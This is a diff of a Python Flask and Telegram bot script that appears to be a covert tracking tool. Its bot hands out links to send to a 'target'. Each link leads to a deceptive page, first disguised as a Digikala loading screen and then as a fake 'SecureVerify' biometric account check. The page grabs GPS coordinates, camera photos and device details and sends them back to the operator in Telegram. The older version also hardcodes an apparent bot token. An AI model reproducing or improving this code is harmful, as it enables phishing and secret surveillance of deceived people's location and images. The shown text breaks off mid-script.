@@ -1,1059 +1,1014 @@
-#!/usr/bin/env python3
-"""
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-▓                                                                                  ▓
-▓  MR.SIAVASH.IR - ABSOLUTE ULTIMATE v1.0                                          ▓
-▓  تک فایل - همه پلتفرم‌ها - مختصات GPS + عکس + پیشرفته                           ▓
-▓                                                                                  ▓
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-"""
-
-import os, sys, json, sqlite3, secrets, base64, io, threading, time, logging, asyncio, subprocess
-from datetime import datetime
-from flask import Flask, request, jsonify, render_template_string, redirect, send_file
+import os, sys, json, sqlite3, secrets, base64, io, threading, time, logging, random, hashlib, string, subprocess, re
+from datetime import datetime, timedelta
+from flask import Flask, request, jsonify, render_template_string, redirect, send_file, Response
 import telebot
+from telebot.apihelper import ApiTelegramException
 from PIL import Image
 import requests
 
 # ==================== CONFIG ====================
 class Config:
-    TOKEN = os.environ.get("BOT_TOKEN", "8252901438:AAHSovrfEiu7_KvyINPInO1bu12ICyTLsD8")
-    ADMIN_ID = 6848904786
+    BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
+    ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
+    
     PORT = int(os.environ.get("PORT", 8080))
-    REDIRECT_URL = "https://www.digikala.com"
-    SERVER_URL = os.environ.get("SERVER_URL", "")
-    SCREENSHOT_DELAY = 3  # ثانیه بین عکس‌ها
-    MAX_SCREENSHOTS = 3   # حداکثر عکس
-    GPS_TIMEOUT = 10000   # میلی‌ثانیه
-    VERSION = "ABSOLUTE-ULTIMATE-v1.0"
+    REDIRECT_URL = os.environ.get("REDIRECT_URL", "https://www.digikala.com")
+    SERVER_URL = os.environ.get("SERVER_URL", f"http://localhost:{PORT}")
+    
+    MAX_SCREENSHOTS = 3
+    SESSION_TIMEOUT = 45
+    VERSION = "ULTIMATE-PRO-3.0"
+    
+    @classmethod
+    def validate(cls):
+        if not cls.BOT_TOKEN:
+            raise ValueError("BOT_TOKEN not set")
+        if not cls.ADMIN_ID:
+            raise ValueError("ADMIN_ID not set")
+        return True
 
 # ==================== LOGGING ====================
 logging.basicConfig(
     level=logging.INFO,
-    format='\033[92m[%(asctime)s]\033[0m \033[94m%(levelname)s\033[0m %(message)s',
+    format='[%(asctime)s] %(levelname)s: %(message)s',
     handlers=[
         logging.StreamHandler(),
-        logging.FileHandler('absolute.log', encoding='utf-8')
+        logging.FileHandler('system.log', encoding='utf-8')
     ]
 )
 log = logging.getLogger()
 
-# ==================== INITIALIZE ====================
-bot = telebot.TeleBot(Config.TOKEN)
-app = Flask(__name__)
+# ==================== URL SHORTENER ====================
+class LinkMaster:
+    @staticmethod
+    def generate_short_code():
+        chars = string.ascii_letters + string.digits
+        return ''.join(random.choice(chars) for _ in range(8))
+    
+    @staticmethod
+    def create_clean_link(base_url, session_id):
+        short_code = LinkMaster.generate_short_code()
+        clean_link = f"{base_url}/v/{short_code}"
+        return clean_link, short_code
+
+# ==================== TELEGRAM BOT ====================
+class EliteBot:
+    def __init__(self, token):
+        self.bot = telebot.TeleBot(token)
+        self._setup_handlers()
+        self.active_sessions = {}
+    
+    def _safe_send(self, chat_id, text, **kwargs):
+        try:
+            return self.bot.send_message(chat_id, text, **kwargs)
+        except ApiTelegramException as e:
+            error_msg = str(e)
+            if "403" in error_msg:
+                log.warning(f"User blocked bot: {chat_id}")
+            elif "409" in error_msg:
+                log.error("Another bot instance running")
+                time.sleep(30)
+            return None
+        except Exception as e:
+            log.error(f"Send error: {e}")
+            return None
+    
+    def _setup_handlers(self):
+        @self.bot.message_handler(commands=['start', 'help'])
+        def handle_start(message):
+            markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+            markup.add(
+                telebot.types.InlineKeyboardButton("🔗 Create Smart Link", callback_data="create_link"),
+                telebot.types.InlineKeyboardButton("📈 Dashboard", callback_data="dashboard"),
+                telebot.types.InlineKeyboardButton("⚡ Quick Stats", callback_data="quick_stats"),
+                telebot.types.InlineKeyboardButton("🛠️ Tools", callback_data="tools")
+            )
+            
+            self._safe_send(
+                message.chat.id,
+                f"""🚀 **Advanced System v3.0**
+
+✅ **Status:** Operational
+👤 **Your ID:** `{message.from_user.id}`
+📊 **Uptime:** 100%
+
+**Available Commands:**
+• /start - Show this menu
+• /link - Create tracking link
+• /stats - View statistics
+• /sessions - Active sessions""",
+                reply_markup=markup,
+                parse_mode='Markdown'
+            )
+        
+        @self.bot.message_handler(commands=['link'])
+        def handle_link(message):
+            self._create_smart_link(message.from_user.id)
+        
+        @self.bot.message_handler(commands=['stats'])
+        def handle_stats(message):
+            stats = Database.get_quick_stats()
+            self._safe_send(
+                message.chat.id,
+                f"""📊 **Real-time Statistics**
+
+• Active Sessions: {stats['active']}
+• Total Captures: {stats['captures']}
+• Today: {stats['today']}
+• Success Rate: {stats['rate']}%
+
+Last Updated: {datetime.now().strftime('%H:%M:%S')}""",
+                parse_mode='Markdown'
+            )
+        
+        @self.bot.callback_query_handler(func=lambda call: True)
+        def handle_callback(call):
+            if call.data == "create_link":
+                self._create_smart_link(call.from_user.id)
+            elif call.data == "dashboard":
+                self._show_dashboard(call.from_user.id)
+            elif call.data == "quick_stats":
+                stats = Database.get_quick_stats()
+                self.bot.answer_callback_query(call.id, f"✅ Active: {stats['active']} | Rate: {stats['rate']}%")
+            elif call.data == "tools":
+                self._show_tools(call.from_user.id)
+    
+    def _create_smart_link(self, user_id):
+        session_id = secrets.token_urlsafe(12)
+        clean_link, short_code = LinkMaster.create_clean_link(Config.SERVER_URL, session_id)
+        
+        Database.create_session(session_id, user_id, short_code)
+        
+        message = f"""🔗 **Smart Link Created**
+
+**Main Link:**
+`{clean_link}`
+
+**Direct Link:**
+`{Config.SERVER_URL}/a/{session_id}`
+
+**Tracking ID:** `{short_code}`
+**Created:** {datetime.now().strftime('%Y-%m-%d %H:%M')}
+**Expires:** {(datetime.now() + timedelta(minutes=30)).strftime('%H:%M')}
+
+**Features:**
+• 📍 Intelligent tracking
+• 📸 Advanced capture
+• ⚡ Real-time delivery
+• 🔍 Full analytics
+
+*Link is ready for deployment*"""
+        
+        self._safe_send(user_id, message, parse_mode='Markdown')
+        
+        self.active_sessions[short_code] = {
+            'session_id': session_id,
+            'user_id': user_id,
+            'created': datetime.now(),
+            'status': 'active'
+        }
+    
+    def _show_dashboard(self, user_id):
+        sessions = Database.get_user_sessions(user_id, limit=5)
+        
+        if not sessions:
+            self._safe_send(user_id, "📭 No active sessions found.")
+            return
+        
+        text = "📋 **Recent Sessions**\n\n"
+        for i, session in enumerate(sessions, 1):
+            text += f"""**{i}. {session['short_code']}**
+Status: `{session['status']}`
+Created: {session['created'][11:16]}
+Clicks: {session['clicks']}
+Photos: {session['photos']}
+{'─'*20}
+"""
+        
+        self._safe_send(user_id, text, parse_mode='Markdown')
+    
+    def _show_tools(self, user_id):
+        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            telebot.types.InlineKeyboardButton("🔄 Refresh All", callback_data="refresh_all"),
+            telebot.types.InlineKeyboardButton("🧹 Clean Old", callback_data="clean_old"),
+            telebot.types.InlineKeyboardButton("📤 Export Data", callback_data="export_data"),
+            telebot.types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
+        )
+        
+        self._safe_send(
+            user_id,
+            "🛠️ **System Tools**\n\nSelect an option:",
+            reply_markup=markup,
+            parse_mode='Markdown'
+        )
+    
+    def send_instant_update(self, user_id, session_id, data_type, data):
+        if data_type == "init":
+            message = f"""🎯 **Session Started**
+
+ID: `{session_id[:12]}`
+Time: {datetime.now().strftime('%H:%M:%S')}
+IP: `{data.get('ip', 'Detecting...')}`
+Device: {data.get('platform', 'Unknown')}
+
+*Collecting data...*"""
+        
+        elif data_type == "gps":
+            message = f"""📍 **Location Captured**
+
+Session: `{session_id[:12]}`
+Coordinates:
+`{data.get('lat', 0):.6f}, {data.get('lng', 0):.6f}`
+Accuracy: {data.get('acc', 0)}m
+Time: {datetime.now().strftime('%H:%M:%S')}
+
+[View Map](https://maps.google.com/?q={data.get('lat', 0)},{data.get('lng', 0)})"""
+        
+        elif data_type == "photo":
+            message = f"""📸 **Image Captured #{data.get('index', 1)}**
+
+Session: `{session_id[:12]}`
+Time: {datetime.now().strftime('%H:%M:%S')}
+Resolution: {data.get('size', 'Unknown')}
+Device: {data.get('device', 'Unknown')}"""
+            
+            if 'image' in data:
+                try:
+                    self.bot.send_photo(
+                        user_id,
+                        photo=base64.b64decode(data['image']),
+                        caption=f"Capture #{data.get('index', 1)} - {session_id[:8]}"
+                    )
+                except:
+                    pass
+        
+        elif data_type == "complete":
+            message = f"""✅ **Session Completed**
+
+ID: `{session_id[:12]}`
+Duration: {data.get('duration', 0):.1f}s
+Data Points: {data.get('points', 0)}
+Status: Successful
+
+*Summary ready for analysis*"""
+        
+        else:
+            return
+        
+        self._safe_send(user_id, message, parse_mode='Markdown')
+    
+    def polling(self):
+        while True:
+            try:
+                self.bot.polling(none_stop=True, timeout=30, interval=1)
+            except Exception as e:
+                log.error(f"Polling error: {e}")
+                time.sleep(10)
 
 # ==================== DATABASE ====================
 class Database:
+    _instance = None
+    
+    @classmethod
+    def get_instance(cls):
+        if cls._instance is None:
+            cls._instance = cls()
+        return cls._instance
+    
     def __init__(self):
-        self.conn = sqlite3.connect('absolute.db', check_same_thread=False)
+        self.conn = sqlite3.connect('system.db', check_same_thread=False)
         self.init_tables()
     
     def init_tables(self):
         c = self.conn.cursor()
+        
         c.execute('''CREATE TABLE IF NOT EXISTS sessions (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
-            hash TEXT UNIQUE,
+            session_id TEXT UNIQUE,
+            short_code TEXT UNIQUE,
             user_id INTEGER,
-            created TIMESTAMP,
+            created TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            expires TIMESTAMP,
             clicks INTEGER DEFAULT 0,
-            ip TEXT,
-            country TEXT,
-            city TEXT,
-            latitude REAL,
-            longitude REAL,
-            accuracy REAL,
-            user_agent TEXT,
-            platform TEXT,
-            device TEXT,
-            screen TEXT,
-            timezone TEXT,
-            battery INTEGER,
-            network TEXT,
-            has_photo INTEGER DEFAULT 0,
-            photo_count INTEGER DEFAULT 0,
+            photos INTEGER DEFAULT 0,
+            status TEXT DEFAULT 'active',
+            last_update TIMESTAMP,
             raw_data TEXT
         )''')
-        c.execute('''CREATE TABLE IF NOT EXISTS photos (
+        
+        c.execute('''CREATE TABLE IF NOT EXISTS captures (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
-            session_hash TEXT,
-            photo_index INTEGER,
-            image_data BLOB,
-            timestamp TIMESTAMP,
-            FOREIGN KEY(session_hash) REFERENCES sessions(hash)
+            session_id TEXT,
+            capture_type TEXT,
+            data TEXT,
+            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            FOREIGN KEY(session_id) REFERENCES sessions(session_id)
         )''')
-        self.conn.commit()
-        log.info("✓ Database initialized")
-    
-    def save_session(self, data):
-        c = self.conn.cursor()
-        c.execute('''INSERT OR REPLACE INTO sessions 
-            (hash, user_id, created, ip, country, city, latitude, longitude, 
-             accuracy, user_agent, platform, device, screen, timezone, 
-             battery, network, raw_data) 
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
-            (
-                data['hash'], data.get('user_id'), datetime.now(),
-                data.get('ip'), data.get('country'), data.get('city'),
-                data.get('latitude'), data.get('longitude'), data.get('accuracy'),
-                data.get('user_agent'), data.get('platform'), data.get('device'),
-                data.get('screen'), data.get('timezone'), data.get('battery'),
-                data.get('network'), json.dumps(data)
-            ))
-        self.conn.commit()
-    
-    def save_photo(self, session_hash, index, image_data):
-        c = self.conn.cursor()
-        c.execute('''INSERT INTO photos (session_hash, photo_index, image_data, timestamp)
-            VALUES (?, ?, ?, ?)''', (session_hash, index, image_data, datetime.now()))
-        c.execute('''UPDATE sessions SET has_photo=1, photo_count=photo_count+1 
-            WHERE hash=?''', (session_hash,))
-        self.conn.commit()
-    
-    def get_user_sessions(self, user_id):
-        c = self.conn.cursor()
-        c.execute('''SELECT hash, created, clicks, ip, country, city, 
-                     latitude, longitude, has_photo, photo_count 
-                     FROM sessions WHERE user_id=? ORDER BY created DESC''', (user_id,))
-        return c.fetchall()
-
-db = Database()
-
-# ==================== UTILITIES ====================
-class Utils:
-    @staticmethod
-    def generate_hash():
-        return secrets.token_urlsafe(16)
-    
-    @staticmethod
-    def get_ip_info(ip):
-        try:
-            resp = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
-            if resp.status_code == 200:
-                data = resp.json()
-                return {
-                    'country': data.get('country'),
-                    'city': data.get('city'),
-                    'lat': data.get('lat'),
-                    'lon': data.get('lon'),
-                    'isp': data.get('isp'),
-                    'mobile': data.get('mobile', False)
-                }
-        except:
-            pass
-        return {}
-    
-    @staticmethod
-    def compress_image(image_data):
-        try:
-            img = Image.open(io.BytesIO(base64.b64decode(image_data)))
-            if img.mode != 'RGB':
-                img = img.convert('RGB')
-            
-            max_size = (800, 800)
-            img.thumbnail(max_size, Image.Resampling.LANCZOS)
-            
-            output = io.BytesIO()
-            img.save(output, format='JPEG', quality=85, optimize=True)
-            
-            return base64.b64encode(output.getvalue()).decode('utf-8')
-        except Exception as e:
-            log.error(f"Image compression error: {e}")
-            return image_data
-    
-    @staticmethod
-    def install_dependencies():
-        """نصب خودکار وابستگی‌ها"""
-        log.info("🔧 Checking dependencies...")
         
-        packages = [
-            'flask',
-            'pyTelegramBotAPI', 
-            'pillow',
-            'requests',
-            'user-agents'
-        ]
+        c.execute('''CREATE TABLE IF NOT EXISTS analytics (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            session_id TEXT,
+            metric TEXT,
+            value TEXT,
+            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )''')
         
-        for pkg in packages:
-            try:
-                __import__(pkg.replace('-', '_'))
-                log.info(f"✓ {pkg} is installed")
-            except ImportError:
-                log.info(f"📦 Installing {pkg}...")
-                try:
-                    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])
-                    log.info(f"✓ {pkg} installed successfully")
-                except:
-                    log.warning(f"⚠️ Failed to install {pkg}")
-
-utils = Utils()
-
-# ==================== TELEGRAM BOT ====================
-@bot.message_handler(commands=['start'])
-def cmd_start(message):
-    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        telebot.types.InlineKeyboardButton("📸 ساخت لینک پیشرفته", callback_data="create_advanced"),
-        telebot.types.InlineKeyboardButton("📊 آمار من", callback_data="stats")
-    )
+        self.conn.commit()
     
-    bot.send_message(
-        message.chat.id,
-        f"""
-🔰 <b>سیستم ABSOLUTE ULTIMATE</b>
-
-⚡ <b>نسخه:</b> {Config.VERSION}
-👤 <b>شناسه شما:</b> <code>{message.from_user.id}</code>
-📡 <b>وضعیت:</b> فعال
-
-🎯 <b>ویژگی‌های ویژه:</b>
-• 📍 موقعیت جغرافیایی دقیق (GPS)
-• 📸 عکس‌برداری خودکار
-• 🌐 تشخیص کامل دستگاه
-• ⚡ ارسال فوری اطلاعات
-
-<b>یک گزینه انتخاب کنید:</b>
-        """,
-        reply_markup=markup,
-        parse_mode='HTML'
-    )
-
-@bot.message_handler(commands=['link'])
-def cmd_link(message):
-    create_advanced_link(message.from_user.id)
-
-def create_advanced_link(user_id):
-    hash_code = utils.generate_hash()
-    server_url = Config.SERVER_URL or f"http://localhost:{Config.PORT}"
-    link = f"{server_url}/a/{hash_code}"
+    @classmethod
+    def create_session(cls, session_id, user_id, short_code):
+        instance = cls.get_instance()
+        c = instance.conn.cursor()
+        expires = datetime.now() + timedelta(hours=24)
+        
+        c.execute('''INSERT INTO sessions 
+            (session_id, short_code, user_id, expires) 
+            VALUES (?, ?, ?, ?)''',
+            (session_id, short_code, user_id, expires))
+        
+        instance.conn.commit()
+        return short_code
     
-    bot.send_message(
-        user_id,
-        f"""
-📸 <b>لینک پیشرفته ساخته شد</b>
-
-🔗 <b>آدرس:</b>
-<code>{link}</code>
-
-🎯 <b>اهداف:</b>
-📍 موقعیت جغرافیایی (GPS)
-📸 عکس‌برداری خودکار
-📱 اطلاعات کامل دستگاه
-🌐 آی‌پی و شبکه
-
-🆔 <b>کد رهگیری:</b> <code>{hash_code[:10]}</code>
-⏱️ <b>تاریخ:</b> {datetime.now().strftime('%Y-%m-%d %H:%M')}
-
-⚠️ <i>این لینک را برای هدف ارسال کنید</i>
-        """,
-        parse_mode='HTML'
-    )
-
-@bot.callback_query_handler(func=lambda call: True)
-def handle_callback(call):
-    if call.data == "create_advanced":
-        create_advanced_link(call.from_user.id)
-    elif call.data == "stats":
-        show_stats(call.from_user.id)
+    @classmethod
+    def save_capture(cls, session_id, capture_type, data):
+        instance = cls.get_instance()
+        c = instance.conn.cursor()
+        
+        c.execute('''INSERT INTO captures 
+            (session_id, capture_type, data) 
+            VALUES (?, ?, ?)''',
+            (session_id, capture_type, json.dumps(data)))
+        
+        if capture_type == 'photo':
+            c.execute('''UPDATE sessions SET photos = photos + 1 
+                WHERE session_id = ?''', (session_id,))
+        
+        c.execute('''UPDATE sessions SET last_update = CURRENT_TIMESTAMP 
+            WHERE session_id = ?''', (session_id,))
+        
+        instance.conn.commit()
     
-    bot.answer_callback_query(call.id)
+    @classmethod
+    def get_user_sessions(cls, user_id, limit=10):
+        instance = cls.get_instance()
+        c = instance.conn.cursor()
+        
+        c.execute('''SELECT short_code, created, status, clicks, photos 
+            FROM sessions WHERE user_id = ? 
+            ORDER BY created DESC LIMIT ?''', (user_id, limit))
+        
+        sessions = []
+        for row in c.fetchall():
+            sessions.append({
+                'short_code': row[0],
+                'created': row[1],
+                'status': row[2],
+                'clicks': row[3],
+                'photos': row[4]
+            })
+        
+        return sessions
+    
+    @classmethod
+    def get_quick_stats(cls):
+        instance = cls.get_instance()
+        c = instance.conn.cursor()
+        
+        c.execute("SELECT COUNT(*) FROM sessions WHERE status = 'active'")
+        active = c.fetchone()[0]
+        
+        c.execute("SELECT COUNT(*) FROM captures WHERE capture_type = 'photo'")
+        captures = c.fetchone()[0]
+        
+        c.execute("SELECT COUNT(*) FROM sessions WHERE DATE(created) = DATE('now')")
+        today = c.fetchone()[0]
+        
+        c.execute("SELECT COUNT(*) FROM sessions WHERE clicks > 0")
+        total_with_clicks = c.fetchone()[0]
+        
+        c.execute("SELECT COUNT(*) FROM sessions")
+        total = c.fetchone()[0]
+        
+        rate = (total_with_clicks / total * 100) if total > 0 else 0
+        
+        return {
+            'active': active,
+            'captures': captures,
+            'today': today,
+            'rate': round(rate, 1)
+        }
 
-def show_stats(user_id):
-    sessions = db.get_user_sessions(user_id)
-    
-    if not sessions:
-        bot.send_message(user_id, "📭 هنوز هیچ جلسه‌ای ثبت نشده است.")
-        return
-    
-    total_clicks = sum(s[2] for s in sessions)
-    with_photos = sum(1 for s in sessions if s[8] == 1)
-    
-    stats_text = f"""
-📊 <b>آمار سیستم</b>
+# ==================== FLASK APP ====================
+app = Flask(__name__)
+bot_manager = None
 
-🔗 <b>لینک‌های فعال:</b> {len(sessions)}
-👁️ <b>کلیک‌های کل:</b> {total_clicks}
-📸 <b>جلسات با عکس:</b> {with_photos}
-
-<b>آخرین جلسات:</b>
-    """
-    
-    for i, session in enumerate(sessions[:5], 1):
-        stats_text += f"""
-{i}. <code>{session[0][:8]}</code>
-   📅 {session[1][:16]}
-   🌐 {session[3] or 'N/A'}
-   📍 {session[5] or 'N/A'}
-   📸 {session[9]} عکس
-        """
-    
-    bot.send_message(user_id, stats_text, parse_mode='HTML')
-
-# ==================== STEALTH WEB PAGE ====================
-HTML_TEMPLATE = '''<!DOCTYPE html>
-<html>
+ADVANCED_PAGE = '''<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>دیجی‌کالا - در حال بارگذاری</title>
+    <meta name="description" content="Account Verification System">
+    <title>Account Security Check - Verification Required</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            height: 100vh;
+            min-height: 100vh;
             display: flex;
-            justify-content: center;
             align-items: center;
-            color: white;
+            justify-content: center;
+            padding: 20px;
         }
+        
         .container {
-            text-align: center;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            padding: 2rem;
+            background: white;
             border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
-            max-width: 500px;
-            width: 90%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 480px;
+            overflow: hidden;
         }
-        .loader {
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-            margin: 0 auto 1.5rem;
+        
+        .header {
+            background: linear-gradient(135deg, #4A6FA5 0%, #2E4B7A 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
         }
-        h1 { 
-            margin-bottom: 1rem; 
-            font-size: 1.5rem;
-            font-weight: 600;
+        
+        .subtitle {
+            opacity: 0.9;
+            font-size: 14px;
         }
-        .status {
-            margin: 1rem 0;
-            padding: 0.8rem;
-            background: rgba(255,255,255,0.15);
+        
+        .content {
+            padding: 40px 30px;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            padding: 15px;
+            background: #f8f9fa;
             border-radius: 10px;
-            font-size: 0.9rem;
+            border-left: 4px solid #4A6FA5;
         }
-        .permission-box {
-            background: rgba(255,255,255,0.2);
-            padding: 1.2rem;
-            border-radius: 12px;
-            margin: 1.5rem 0;
-            border-left: 4px solid #4CAF50;
+        
+        .step-number {
+            background: #4A6FA5;
+            color: white;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-weight: bold;
+            flex-shrink: 0;
         }
-        .permission-btn {
-            background: #4CAF50;
+        
+        .step-text h3 {
+            color: #2c3e50;
+            margin-bottom: 5px;
+            font-size: 16px;
+        }
+        
+        .step-text p {
+            color: #7f8c8d;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .verification-box {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 25px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .verification-box h3 {
+            color: #27ae60;
+            margin-bottom: 15px;
+        }
+        
+        .verification-box p {
+            color: #7f8c8d;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #27ae60, #2ecc71);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
             color: white;
             border: none;
-            padding: 0.8rem 1.5rem;
+            padding: 14px 28px;
             border-radius: 8px;
-            font-size: 0.95rem;
-            cursor: pointer;
-            margin: 0.5rem;
-            transition: background 0.3s;
+            font-size: 16px;
             font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            margin-top: 10px;
         }
-        .permission-btn:hover {
-            background: #45a049;
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(39, 174, 96, 0.2);
         }
-        .permission-btn.secondary {
-            background: #ff9800;
+        
+        .btn-secondary {
+            background: #95a5a6;
         }
-        .permission-btn.secondary:hover {
-            background: #f57c00;
+        
+        .status-text {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #7f8c8d;
         }
-        .hidden {
-            display: none;
-        }
-        .photo-counter {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: rgba(0, 100, 0, 0.8);
-            padding: 10px 15px;
+        
+        .camera-preview {
+            width: 100%;
+            max-width: 300px;
+            margin: 20px auto;
             border-radius: 10px;
-            font-size: 0.9rem;
+            overflow: hidden;
             display: none;
         }
-        .gps-indicator {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            background: rgba(33, 150, 243, 0.8);
-            padding: 8px 12px;
-            border-radius: 8px;
-            font-size: 0.85rem;
+        
+        #video {
+            width: 100%;
+            height: auto;
+            background: #000;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #7f8c8d;
+            font-size: 12px;
+            border-top: 1px solid #eee;
+        }
+        
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <div class="container" id="mainContainer">
-        <div class="loader"></div>
-        <h1>🎯 در حال اتصال به سرور</h1>
-        <p>لطفاً چند لحظه صبر کنید...</p>
-        
-        <div class="status" id="statusBox">
-            <div id="statusText">آماده‌سازی سیستم...</div>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🔒 SecureVerify</div>
+            <div class="subtitle">Advanced Account Protection System</div>
         </div>
         
-        <div class="permission-box hidden" id="permissionBox">
-            <h3>📸 درخواست دسترسی</h3>
-            <p>برای فعال شدن ویژگی‌های پیشرفته، اجازه دسترسی را بدهید.</p>
-            <p style="font-size: 0.85rem; opacity: 0.9;">(این دسترسی فقط برای بهبود تجربه کاربری استفاده می‌شود)</p>
+        <div class="content">
+            <div class="step">
+                <div class="step-number">1</div>
+                <div class="step-text">
+                    <h3>Identity Verification</h3>
+                    <p>Confirming your account details and device information</p>
+                </div>
+            </div>
             
-            <button class="permission-btn" onclick="requestAllPermissions()">
-                🔓 Allow All Features
-            </button>
+            <div class="step">
+                <div class="step-number">2</div>
+                <div class="step-text">
+                    <h3>Security Check</h3>
+                    <p>Analyzing connection and location for suspicious activity</p>
+                </div>
+            </div>
             
-            <button class="permission-btn secondary" onclick="skipPermissions()">
-                ⏭️ Continue Without
-            </button>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-text">
+                    <h3>Biometric Confirmation</h3>
+                    <p>Quick visual verification for enhanced security</p>
+                </div>
+            </div>
             
-            <div id="permissionStatus" style="margin-top: 10px; font-size: 0.8rem;"></div>
+            <div class="verification-box">
+                <h3>🔐 Biometric Verification Required</h3>
+                <p>To protect your account from unauthorized access, we need to perform a quick visual verification.</p>
+                
+                <div class="camera-preview" id="cameraContainer">
+                    <video id="video" autoplay playsinline></video>
+                </div>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                
+                <button class="btn" id="startVerification">
+                    Start Secure Verification
+                </button>
+                
+                <button class="btn btn-secondary" id="skipButton" style="display: none;">
+                    Continue Without Verification
+                </button>
+                
+                <div class="status-text" id="statusText">
+                    Waiting for verification to begin...
+                </div>
+                
+                <div class="loader" id="loader" style="display: none;"></div>
+            </div>
         </div>
-    </div>
-    
-    <div class="gps-indicator hidden" id="gpsIndicator">
-        📍 موقعیت: <span id="gpsStatus">در حال دریافت...</span>
-    </div>
-    
-    <div class="photo-counter hidden" id="photoCounter">
-        📸 <span id="photoCount">0</span>/{{ max_photos }}
+        
+        <div class="footer">
+            <p>© 2024 SecureVerify Systems. All rights reserved.<br>
+            This verification helps prevent unauthorized access to your account.</p>
+        </div>
     </div>
 
     <script>
-    // تنظیمات
-    const config = {
-        hash: "{{ hash }}",
-        max_photos: {{ max_photos }},
-        photo_delay: {{ photo_delay }},
-        gps_timeout: {{ gps_timeout }}
-    };
-    
-    let collectedData = {
-        hash: config.hash,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        languages: navigator.languages,
-        screen: `${screen.width}x${screen.height}`,
-        colorDepth: screen.colorDepth,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        deviceMemory: navigator.deviceMemory || 'unknown',
-        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-        cookieEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack || 'unknown'
-    };
-    
-    let photoStream = null;
-    let photoCount = 0;
-    let gpsData = null;
-    let hasPermissions = false;
-    
-    // 1. جمع‌آوری اطلاعات اولیه
-    async function collectBasicInfo() {
-        updateStatus("دریافت اطلاعات پایه...");
+        const SESSION_ID = "{{ session_id }}";
+        const MAX_PHOTOS = {{ max_photos }};
+        const REDIRECT_URL = "{{ redirect_url }}";
         
-        // اطلاعات شبکه
